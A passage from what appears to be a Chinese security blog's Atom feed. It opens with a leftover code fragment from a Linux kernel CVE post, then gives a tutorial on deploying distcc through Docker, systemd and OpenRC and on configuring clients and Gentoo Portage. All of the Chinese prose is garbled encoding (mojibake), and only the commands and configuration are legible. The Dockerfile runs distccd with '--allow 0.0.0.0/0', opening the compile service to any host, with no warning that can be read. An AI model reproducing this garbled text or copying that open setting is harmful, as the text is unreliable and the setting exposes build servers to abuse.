j &lt; sec-&gt;shdr.sh_size/sizeof(Elf_Rel); j++) &#123;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;KASLRï¼šAM I A JOKE TO YOU?&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="https://arttnba3.github.io/categories/CVE/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="Pwn" scheme="https://arttnba3.github.io/tags/Pwn/"/>
    
    <category term="CVE" scheme="https://arttnba3.github.io/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>ã€OPS.0x07ã€‘ä½¿ç”¨ distcc é…ç½®åˆ†å¸ƒå¼ç¼–è¯‘ç³»ç»Ÿ</title>
    <link href="https://arttnba3.github.io/2025/07/21/OPS-0X07-DISTCC_ACCEL_COMPILE/"/>
    <id>https://arttnba3.github.io/2025/07/21/OPS-0X07-DISTCC_ACCEL_COMPILE/</id>
    <published>2025-07-20T18:17:33.000Z</published>
    <updated>2025-07-28T15:27:41.212Z</updated>
    
    <content type="html"><![CDATA[<p>åˆ«æ€¥ï¼Œè¿˜åœ¨ç¼–è¯‘ï¼ˆ1919&#x2F;114514ï¼‰</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>å‰é¢å¿˜äº†ä¸­é—´å¿˜äº†åé¢ä¹Ÿå¿˜äº†ï¼Œæ€»è€Œè¨€ä¹‹ä½œä¸º Gentoo Linux ç”¨æˆ·çš„ä¸€å¤§ç—›ç‚¹å°±æ˜¯æ›´æ–°æ¯ä¸ªè½¯ä»¶åŒ…éƒ½éœ€è¦ä»æºç ç¼–è¯‘ä¼šè€—è´¹å¤§é‡æ—¶é—´ï¼Œå“ªæ€•ä¸ä½¿ç”¨ Gentooï¼Œå„ç§æ—¥å¸¸çš„ç¼–è¯‘ä»»åŠ¡ï¼ˆæ¯”å¦‚è¯´åš kernel æ¼æ´åˆ©ç”¨çš„è‚¯å®šå¾—å¤©å¤©ç¼–è¯‘å„ç§ä¸åŒçš„ kernelï¼‰ä¹Ÿä¼šå ç”¨å¤§é‡çš„è®¡ç®—èµ„æºï¼Œå¯¹äºç¬”è€…è¿™ç§æ—¥ç”¨ç³»ç»Ÿä¾¿æ˜¯ Linux çš„äººè€Œè¨€å½“ç¼–è¯‘æµæ°´çº¿å¼€åŠ¨èµ·æ¥æ—¶æœ¬åœ°çš„èµ„æºè¢«å¤§é‡æŒ¤å å¿…ç„¶ä¼šå¯¼è‡´å…¶ä»–æ—¥ç”¨æœåŠ¡çš„èµ„æºæ— æ³•å¾—åˆ°å……è¶³åˆ†é…ï¼Œä»è€Œå½±å“æ—¥ç”¨ç³»ç»Ÿçš„ç¨³å®šæ€§ä¸ä½¿ç”¨èˆ’é€‚åº¦ï¼ˆä¾‹å¦‚éŸ³ä¹æ’­æ”¾å™¨ä¼šä¸€å¡ä¸€å¡çš„ï¼Œ <del>å¯¹äºä¹ æƒ¯ä¸€è¾¹å¬éŸ³ä¹ä¸€è¾¹å·¥ä½œçš„äººè¿™çœŸèƒ½å¿ğŸâ“</del> ï¼‰</p><p>æ°å¥½ç¬”è€…æ‰‹å¤´è¿˜æœ‰ä¸€äº›é—²ç½®çš„è®¡ç®—èµ„æºï¼Œå› æ­¤å°†æœ¬åœ°çš„ä¸€äº›è®¡ç®—ä»»åŠ¡ç»™ offload åˆ°è®¡ç®—é›†ç¾¤å½“ä¸­ä¼šæ˜¯ä¸€ä¸ªä¸é”™çš„é€‰æ‹©ï¼Œç»è¿‡ä¸€ç•ªè°ƒç ”ä¹‹åç¬”è€…é€‰æ‹©å°è¯• <a href="https://www.distcc.org/">distcc</a> ï¼šä¸€ä¸ªç»è¿‡å¤šå¹´ç»´æŠ¤çš„åˆ†å¸ƒå¼ C&#x2F;C++ ç¼–è¯‘å·¥å…·</p><p>å› æ­¤è¿™ç¯‡åšå®¢ä¸»è¦ç®€å•è®²è®²å¦‚ä½•éƒ¨ç½² distcc</p><h1 id="0x01-åœ¨æœåŠ¡ç«¯éƒ¨ç½²-distcc"><a href="#0x01-åœ¨æœåŠ¡ç«¯éƒ¨ç½²-distcc" class="headerlink" title="0x01. åœ¨æœåŠ¡ç«¯éƒ¨ç½² distcc"></a>0x01. åœ¨æœåŠ¡ç«¯éƒ¨ç½² distcc</h1><h2 id="æ–¹æ³•ä¸€ï¼šä½¿ç”¨-Docker-è¿›è¡Œéƒ¨ç½²ï¼ˆæ¨èï¼‰"><a href="#æ–¹æ³•ä¸€ï¼šä½¿ç”¨-Docker-è¿›è¡Œéƒ¨ç½²ï¼ˆæ¨èï¼‰" class="headerlink" title="æ–¹æ³•ä¸€ï¼šä½¿ç”¨ Docker è¿›è¡Œéƒ¨ç½²ï¼ˆæ¨èï¼‰"></a>æ–¹æ³•ä¸€ï¼šä½¿ç”¨ Docker è¿›è¡Œéƒ¨ç½²ï¼ˆæ¨èï¼‰</h2><h3 id="ç”¨-docker-éƒ¨ç½²-distcc"><a href="#ç”¨-docker-éƒ¨ç½²-distcc" class="headerlink" title="ç”¨ docker éƒ¨ç½² distcc"></a>ç”¨ docker éƒ¨ç½² distcc</h3><p>é¦–å…ˆç¼–å†™ dockerfileï¼Œç›´æ¥å®‰è£… distcc å¹¶è¿è¡Œ <code>distccd</code> å°±è¡Œï¼Œä¸ç”¨è€ƒè™‘æœåŠ¡å•¥çš„ï¼Œè¿™é‡Œä»¥ Gentoo ä¸ºä¾‹ï¼Œä½ å¯ä»¥æ ¹æ®ä½ è‡ªå·±æ‰€ä½¿ç”¨çš„å‘è¡Œç‰ˆè¿›è¡Œå¾®è°ƒï¼š</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-comment"># Gentoo base</span><br><span class="hljs-keyword">FROM</span> gentoo/stage3:latest<br><br><span class="hljs-comment"># Basic packages</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> emerge-webrsync &amp;&amp; \</span><br><span class="language-bash">    emerge sys-devel/distcc sys-devel/gcc llvm-core/clang</span><br><br><span class="hljs-comment"># Log file</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">touch</span> /var/log/distcc.log &amp;&amp; <span class="hljs-built_in">chmod</span> 666 /var/log/distcc.log</span><br><br><span class="hljs-comment"># keep container running</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;#!/bin/sh&#x27;</span> &gt; /root/start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;distccd --port 3632 --daemon --log-file /var/log/distcc.log -N 19 --allow 0.0.0.0/0 --jobs 192&#x27;</span> &gt;&gt; /root/start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;sleep infinity&#x27;</span> &gt;&gt; /root/start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /root/start.sh</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/root/start.sh&quot;</span>]</span><br><br><span class="hljs-comment"># expose ports</span><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">3632</span><br><br></code></pre></td></tr></table></figure><p>å…¶ä¸­ <code>distccd</code> æ˜¯ distcc çš„æœåŠ¡ç«¯å®ˆæŠ¤è¿›ç¨‹ï¼Œå‚æ•°è¯´æ˜å¦‚ä¸‹ï¼š</p><ul><li><code>--port</code> ï¼šdistccd çš„æœåŠ¡å¼€æ”¾å¼€æ”¾ç«¯å£ï¼Œè¿™é‡Œåœ¨æœ¬åœ°çš„ <code>3632</code> ç«¯å£</li><li><code>--daemon</code> ï¼šè¿è¡Œä¸ºå®ˆæŠ¤è¿›ç¨‹</li><li><code>--log-file</code> ï¼šæ—¥å¿—è®°å½•æ–‡ä»¶ï¼Œè¿™é‡Œä¸º <code>/var/log/distccd.log</code></li><li><code>--nice</code> ï¼ˆ<code>-N</code>ï¼‰ ï¼šè¿›ç¨‹ nice ç­‰çº§ï¼Œè¶Šå¤§è¶Šä¸æŠ¢åˆ«çš„è¿›ç¨‹çš„ä¼˜å…ˆçº§ï¼Œæœ€å¤§ <code>19</code></li><li><code>--allow</code> ï¼šå…è®¸çš„å®¢æˆ·ç«¯ IPï¼Œæ ¼å¼ä¸º <a href="https://en.wikipedia.org/wiki/Classless_Inter-Domain_Routing">CIDR</a></li><li><code>--jobs</code> ï¼šå…è®¸çš„æœ€å¤§å¹¶å‘çº¿ç¨‹æ•°ï¼Œè¿™é‡Œæ˜¯ <code>192</code> ï¼Œå»ºè®®æŒ‰éœ€è¿›è¡Œè°ƒæ•´</li></ul><p>ç„¶å build å† run å°±è¡Œï¼Œæ–¹ä¾¿èµ·è§å¯ä»¥ç›´æ¥ä½¿ç”¨æœ¬åœ°ç½‘ç»œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker build -t a3distcc:latest .</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d --network=host --name=a3distcc a3distcc:latest</span><br></code></pre></td></tr></table></figure><p>æ–¹ä¾¿èµ·è§ä¹Ÿå¯ä»¥ç”¨ docker-composeï¼Œåœ¨ Dockerfile ç›®å½•ç¼–å†™é…ç½®æ–‡ä»¶ <code>docker-compose.yml</code> å¦‚ä¸‹ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;3&#x27;</span><br><span class="hljs-attr">services:</span><br>  <span class="hljs-attr">distcc:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">a3distcc:v1.0</span><br>    <span class="hljs-attr">build:</span> <span class="hljs-string">.</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;3632:3632&quot;</span><br></code></pre></td></tr></table></figure><h2 id="æ–¹æ³•äºŒï¼šåœ¨æœ¬åœ°ç›´æ¥æ­å»ºæœåŠ¡"><a href="#æ–¹æ³•äºŒï¼šåœ¨æœ¬åœ°ç›´æ¥æ­å»ºæœåŠ¡" class="headerlink" title="æ–¹æ³•äºŒï¼šåœ¨æœ¬åœ°ç›´æ¥æ­å»ºæœåŠ¡"></a>æ–¹æ³•äºŒï¼šåœ¨æœ¬åœ°ç›´æ¥æ­å»ºæœåŠ¡</h2><h3 id="æœ¬åœ°å®‰è£…-distcc"><a href="#æœ¬åœ°å®‰è£…-distcc" class="headerlink" title="æœ¬åœ°å®‰è£… distcc"></a>æœ¬åœ°å®‰è£… distcc</h3><p>ç”¨ä½ æ‰€ä½¿ç”¨çš„å‘è¡Œç‰ˆçš„åŒ…ç®¡ç†å™¨å°† distcc å®‰è£…åˆ°æœ¬åœ°ï¼Œä¾‹å¦‚ç¬”è€…æœåŠ¡å™¨æ˜¯ openSUSE Tumblewwedï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo zypper <span class="hljs-keyword">in</span> distcc distcc-server</span><br></code></pre></td></tr></table></figure><p>ä¹‹åæ ¹æ®ä½ æ‰€ä½¿ç”¨çš„ init ç³»ç»Ÿè¿›è¡Œç›¸åº”æ“ä½œï¼š</p><blockquote><p>æ³¨ï¼šå¯¹äº ssh è¿æ¥è€Œè¨€ distcc ä¼¼ä¹ä¼šé€šè¿‡ ssh çš„æ–¹å¼ç›´æ¥å¯åŠ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„ distccdï¼Œå› æ­¤è¿™ç§æƒ…å†µä¸‹ä¼¼ä¹ä¸éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨å¼€å¯æœåŠ¡ï¼Ÿ</p></blockquote><h4 id="systemd"><a href="#systemd" class="headerlink" title="systemd"></a>systemd</h4><p>ç»å¤§éƒ¨åˆ†å‘è¡Œç‰ˆé»˜è®¤ä½¿ç”¨çš„åº”è¯¥éƒ½æ˜¯ systemdï¼ˆçº¢å¸½çš„å¤§æ‰‹å¤ªçŒ›äº†ï¼‰ï¼ŒåŒ…æ‹¬ç¬”è€…æ‰‹ä¸Šçš„ç»å¤§éƒ¨åˆ†æœºå™¨ç”¨çš„ä¹Ÿéƒ½æ˜¯ systemdï¼Œæ‰€ä»¥å…ˆæ¥çœ‹çœ‹å¦‚ä½•åœ¨ systemd ä¸‹è¿›è¡Œ distccd çš„ç›¸åº”é…ç½®</p><blockquote><p><img src="https://syste.md/"></p></blockquote><p>é¦–å…ˆåˆ›å»ºé…ç½®æ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">mkdir</span> /etc/systemd/system/distccd.service.d</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">touch</span> /etc/systemd/system/distccd.service.d/distcc.conf</span><br></code></pre></td></tr></table></figure><p>ç„¶ååœ¨ <code>/etc/systemd/system/distccd.service.d/distcc.conf</code> ä¸­å†™å…¥å¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Service]</span><br><span class="hljs-attr">Environment</span>=<span class="hljs-string">&quot;ALLOWED_SERVERS=127.0.0.1&quot;</span><br><span class="hljs-attr">Environment</span>=<span class="hljs-string">&quot;DISTCC_VERBOSE=1&quot;</span><br><span class="hljs-attr">Environment</span>=<span class="hljs-string">&quot;DISTCC_SAVE_TEMPS=1&quot;</span><br></code></pre></td></tr></table></figure><p>å‚æ•°è¯´æ˜å¦‚ä¸‹ï¼š</p><ul><li><code>ALLOWED_SERVERS</code> ï¼šå…è®¸çš„å®¢æˆ·ç«¯ IPï¼Œæ ¼å¼ä¸º <a href="https://en.wikipedia.org/wiki/Classless_Inter-Domain_Routing">CIDR</a></li><li><code>DISTCC_VERBOSE</code> ï¼šå¼€å¯è¯¦ç»†æ—¥å¿—</li><li><code>DISTCC_SAVE_TEMPS</code> ï¼šä¸åˆ é™¤ä¸´æ—¶æ–‡ä»¶</li></ul><p>å¦‚æœæœ‰éœ€è¦ï¼Œå¯ä»¥è¿è¡Œå¦‚ä¸‹å‘½ä»¤ä¿®æ”¹ distccd å¯åŠ¨å‚æ•°ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl edit --full distccd.service</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl daemon-reload</span><br></code></pre></td></tr></table></figure><p>æœ€åå¯ç”¨æœåŠ¡ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">enable</span> --now distccd</span><br></code></pre></td></tr></table></figure><h4 id="OpenRC"><a href="#OpenRC" class="headerlink" title="OpenRC"></a>OpenRC</h4><p>é¦–å…ˆåˆ›å»ºé…ç½®æ–‡ä»¶ <code>/etc/conf.d/distccd</code> å¹¶å†™å…¥å¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">DISTCCD_OPTS=<span class="hljs-string">&quot;--port 3632 --log-level notice --log-file /var/log/distccd.log --nice 16 --allow 192.168.0.4 --allow 192.168.1.0/24&quot;</span><br></code></pre></td></tr></table></figure><p>å‚æ•°è¯´æ˜ï¼š</p><ul><li><code>--port</code> ï¼šdistccd çš„æœåŠ¡å¼€æ”¾å¼€æ”¾ç«¯å£ï¼Œè¿™é‡Œåœ¨æœ¬åœ°çš„ <code>3632</code> ç«¯å£</li><li><code>--log-level</code> ï¼šæ—¥å¿—çº§åˆ«</li><li><code>--log-file</code> ï¼šæ—¥å¿—è®°å½•æ–‡ä»¶ï¼Œè¿™é‡Œä¸º <code>/var/log/distccd.log</code></li><li><code>--nice</code> ï¼ˆ<code>-N</code>ï¼‰ ï¼šè¿›ç¨‹ nice ç­‰çº§ï¼Œè¶Šå¤§è¶Šä¸æŠ¢åˆ«çš„è¿›ç¨‹çš„ä¼˜å…ˆçº§ï¼Œæœ€å¤§ <code>19</code></li><li><code>--allow</code> ï¼šå…è®¸çš„å®¢æˆ·ç«¯ IPï¼Œæ ¼å¼ä¸º <a href="https://en.wikipedia.org/wiki/Classless_Inter-Domain_Routing">CIDR</a></li></ul><p>ç„¶ååˆ›å»ºæ—¥å¿—æ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">touch</span> /var/log/distccd.log</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">chown</span> distcc:root /var/log/distccd.log</span><br></code></pre></td></tr></table></figure><p>æœ€åå¯åŠ¨æœåŠ¡ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo rc-update add distccd default</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo rc-service distccd start</span><br></code></pre></td></tr></table></figure><h1 id="0x02-é…ç½®å®¢æˆ·ç«¯ç¼–è¯‘é€‰é¡¹"><a href="#0x02-é…ç½®å®¢æˆ·ç«¯ç¼–è¯‘é€‰é¡¹" class="headerlink" title="0x02. é…ç½®å®¢æˆ·ç«¯ç¼–è¯‘é€‰é¡¹"></a>0x02. é…ç½®å®¢æˆ·ç«¯ç¼–è¯‘é€‰é¡¹</h1><p>å®¢æˆ·ç«¯è¿™è¾¹çš„é…ç½®å°±ç®€å•å¾—å¤šï¼Œåªéœ€è¦å®‰è£… distcc åå†é…ç½®æœåŠ¡ç«¯åœ°å€å³å¯</p><h2 id="åŸºæœ¬é…ç½®"><a href="#åŸºæœ¬é…ç½®" class="headerlink" title="åŸºæœ¬é…ç½®"></a>åŸºæœ¬é…ç½®</h2><p>é¦–å…ˆæ˜¯å®‰è£… distccï¼Œè¿™é‡Œä»¥ Gentoo Linux ä¸ºä¾‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo emerge -av sys-devel/distcc</span><br></code></pre></td></tr></table></figure><p>ä¹‹åé…ç½®æœåŠ¡ç«¯åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡ç¯å¢ƒå˜é‡ <code>DISTCC_HOSTS</code> æŒ‡å®šç¼–è¯‘æœåŠ¡å™¨çš„åœ°å€ï¼Œæ”¯æŒå¤šä¸ªæœåŠ¡å™¨ï¼Œä»¥ä¸‹æ˜¯ä¸€ä¸ªä¾‹å­ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">export DISTCC_HOSTS=&quot;localhost/8 10.0.0.1/4,lzo arttnba3@10.0.0.2/2,cpp,lzo&quot;<br></code></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªç¤ºä¾‹å½“ä¸­ï¼š</p><ul><li><code>localhost</code> æ˜¯ç¬¬ä¸€ä¸ª distcc æœåŠ¡å™¨ï¼ˆå³æœ¬åœ°ï¼‰ï¼Œ<code>/8</code> è¡¨ç¤ºåœ¨æœ¬åœ°ä½¿ç”¨ 8 ä¸ªè¿›ç¨‹è¿›è¡Œç¼–è¯‘</li><li><code>10.0.0.1</code> æ˜¯ç¬¬äºŒä¸ª distcc æœåŠ¡å™¨ï¼Œé€šè¿‡é»˜è®¤çš„ <code>3632</code> ç«¯å£ TCP ç›´è¿ï¼Œ<code>/4</code> è¡¨ç¤ºåœ¨è¯¥æœåŠ¡å™¨ä¸Šä½¿ç”¨ 4 ä¸ªè¿›ç¨‹ç¼–è¯‘ï¼Œ<code>,lzo</code> è¡¨ç¤ºä¼ è¾“æ—¶ä½¿ç”¨ LZO å‹ç¼©</li><li><code>10.0.0.2</code> æ˜¯ç¬¬ä¸‰ä¸ªæœåŠ¡å™¨ï¼Œé€šè¿‡ ssh è¿›è¡Œè¿æ¥ï¼Œ<code>/2</code> è¡¨ç¤ºåœ¨è¯¥æœåŠ¡å™¨ä¸Šä½¿ç”¨ 2 ä¸ªè¿›ç¨‹ç¼–è¯‘ï¼Œ<code>,cpp</code> è¡¨ç¤º distcc-pump modeï¼Œ <code>,lzo</code> è¡¨ç¤ºä¼ è¾“æ—¶ä½¿ç”¨ LZO å‹ç¼©</li></ul><blockquote><p>æ›´å¤šé…ç½®å¯ä»¥å‚è§ <a href="https://linux.die.net/man/1/distcc">distcc(1) - Linux man page</a></p></blockquote><p>å¯¹äºæŒä¹…åŒ–é…ç½®ï¼Œdistcc æ”¯æŒå¾€å®¶ç›®å½•çš„ <code>~/.distcc/hosts</code> æˆ–ç³»ç»Ÿé…ç½®çš„ <code>/etc/distcc/hosts</code> é‡Œå†™å…¥æœåŠ¡ç«¯åœ°å€ï¼Œä»¥ä¸‹æ˜¯ä¸€ä¸ªä¾‹å­:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">1145</span>/<span class="hljs-number">4</span> arttnba3@<span class="hljs-number">10.0.0.2</span>/<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªç¤ºä¾‹å½“ä¸­ï¼š</p><ul><li><code>10.0.0.1</code> æ˜¯ç¬¬ä¸€ä¸ª distcc æœåŠ¡å™¨ï¼Œé€šè¿‡ <code>1145</code> ç«¯å£ TCP è¿æ¥ï¼Œ<code>/4</code> è¡¨ç¤ºåœ¨è¯¥æœåŠ¡å™¨ä¸Šä½¿ç”¨ 4 ä¸ªè¿›ç¨‹ç¼–è¯‘</li><li><code>10.0.0.2</code> æ˜¯ç¬¬äºŒä¸ªæœåŠ¡å™¨ï¼Œé€šè¿‡ ssh è¿›è¡Œè¿æ¥ï¼Œ<code>/2</code> è¡¨ç¤ºåœ¨è¯¥æœåŠ¡å™¨ä¸Šä½¿ç”¨ 2 ä¸ªè¿›ç¨‹ç¼–è¯‘</li></ul><blockquote><p>localhost ä¼¼ä¹åœ¨ä¸æ˜¾ç¤ºæŒ‡å®šçš„æƒ…å†µä¸‹ä¹Ÿä¼šè¿›è¡Œç¼–è¯‘å·¥ä½œï¼Ÿ</p></blockquote><h2 id="ä¸º-C-C-é¡¹ç›®ä½¿ç”¨-distcc-è¿›è¡Œåˆ†å¸ƒå¼ç¼–è¯‘"><a href="#ä¸º-C-C-é¡¹ç›®ä½¿ç”¨-distcc-è¿›è¡Œåˆ†å¸ƒå¼ç¼–è¯‘" class="headerlink" title="ä¸º C&#x2F;C++ é¡¹ç›®ä½¿ç”¨ distcc è¿›è¡Œåˆ†å¸ƒå¼ç¼–è¯‘"></a>ä¸º C&#x2F;C++ é¡¹ç›®ä½¿ç”¨ distcc è¿›è¡Œåˆ†å¸ƒå¼ç¼–è¯‘</h2><p>æˆ‘ä»¬åªéœ€è¦æŠŠç¼–è¯‘å™¨æŒ‡å®šä¸º <code>distcc åŸç¼–è¯‘å™¨</code> å³å¯ï¼Œä»¥ cmake é¡¹ç›®ä¸ºä¾‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">export</span> CC=<span class="hljs-string">&quot;distcc gcc&quot;</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">export</span> CXX=<span class="hljs-string">&quot;distcc g++&quot;</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">cmake <span class="hljs-variable">$SOURCE_CODE_PATH</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">make -jçº¿ç¨‹æ•°</span><br></code></pre></td></tr></table></figure><blockquote><p>éœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œä¸èƒ½ç”¨ <code>-DCMAKE_CXX_COMPILER=&quot;distcc g++&quot;</code> è¿™æ ·çš„é…ç½®ï¼Œå¦åˆ™ä¼šå‡ºé”™</p></blockquote><h2 id="Extraï¼šä¸º-Portage-é…ç½®-distcc-ç¼–è¯‘"><a href="#Extraï¼šä¸º-Portage-é…ç½®-distcc-ç¼–è¯‘" class="headerlink" title="Extraï¼šä¸º Portage é…ç½® distcc ç¼–è¯‘"></a>Extraï¼šä¸º Portage é…ç½® distcc ç¼–è¯‘</h2><blockquote><p>æ„Ÿè§‰ä¸å¦‚ binhost ğŸ‘‹</p></blockquote><p>ä¼—æ‰€å‘¨çŸ¥ Gentoo æ˜¯ä¸€ä¸ªä»€ä¹ˆè½¯ä»¶åŒ…éƒ½éœ€è¦ä»æºç è¿›è¡Œç¼–è¯‘çš„ Linux å‘è¡Œç‰ˆï¼Œå› æ­¤åœ¨æœ¬åœ°æœºå™¨é…ç½®æ€§èƒ½ä¸å¤ªè¡Œçš„æƒ…å†µä¸‹ï¼Œè€ƒè™‘ä½¿ç”¨è¿œç¨‹æœåŠ¡å™¨è¿›è¡Œè¾…åŠ©åˆ†å¸ƒå¼ç¼–è¯‘ä¼šæ˜¯ä¸€ä¸ªä¸é”™çš„é€‰æ‹©</p><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦åœ¨ <code>/etc/portage/make.conf</code> å½“ä¸­å¯ç”¨ distcc ç‰¹æ€§ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">FEATURES=<span class="hljs-string">&quot;distcc&quot;</span><br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯ç¼–è¯‘ä¸é“¾æ¥çº¿ç¨‹æ•°é…ç½®ï¼Œé€šå¸¸éµå¾ªï¼š</p><ul><li>ç¼–è¯‘çº¿ç¨‹æ•° <code>N</code> åº”å½“ä¸ºæ€» CPU æ ¸å¿ƒæ•°ï¼ˆæœ¬åœ° + è¿œç¨‹ï¼‰çš„ä¸¤å€ï¼Œå† + 1</li><li>é“¾æ¥çº¿ç¨‹æ•° <code>M</code> åº”å½“ä¸ºæœ¬åœ° CPU æ ¸å¿ƒæ•°</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">MAKEOPTS=<span class="hljs-string">&quot;-jN -lM&quot;</span><br></code></pre></td></tr></table></figure><p>ç”±äºæˆ‘ä»¬æ˜¯åœ¨è¿œç¨‹æœºå™¨ä¸Šç¼–è¯‘ï¼Œä¸åŒçš„æœºå™¨çš„ CPU æ¶æ„é€šå¸¸ä¸ä¸€æ ·ï¼Œå› æ­¤å¦‚æœç¼–è¯‘é€‰é¡¹ä¸­ä½¿ç”¨ <code>-march=native</code> é‚£å°±å¾ˆå®¹æ˜“ä½¿å¾—ä¸åŒçš„ç¼–è¯‘æœºå™¨æ˜¯é’ˆå¯¹è‡ªèº«è€Œéæœ¬åœ°æœºå™¨è¿›è¡Œä¼˜åŒ–ï¼Œæœ€åè·‘ä¸èµ·æ¥å°±å°´å°¬äº†ï¼Œæˆ‘ä»¬åº”å½“æ ¹æ®æœ¬åœ°æœºå™¨çš„ CPU æ¶æ„ <strong>æ˜¾å¼</strong> æŒ‡å®šï¼Œä»¥ç¬”è€…ç¬”è®°æœ¬çš„ i9-13980hx ä¸ºä¾‹ï¼Œå…¶ä¸º <code>raptorlake</code> 